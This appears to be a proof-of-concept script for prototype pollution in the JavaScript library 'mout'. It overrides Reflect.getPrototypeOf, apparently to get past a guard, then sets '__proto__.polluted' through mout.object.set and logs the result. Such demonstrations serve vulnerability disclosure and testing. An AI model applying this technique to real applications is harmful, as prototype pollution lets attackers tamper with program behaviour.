Reflect.getPrototypeOf = () => false;
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);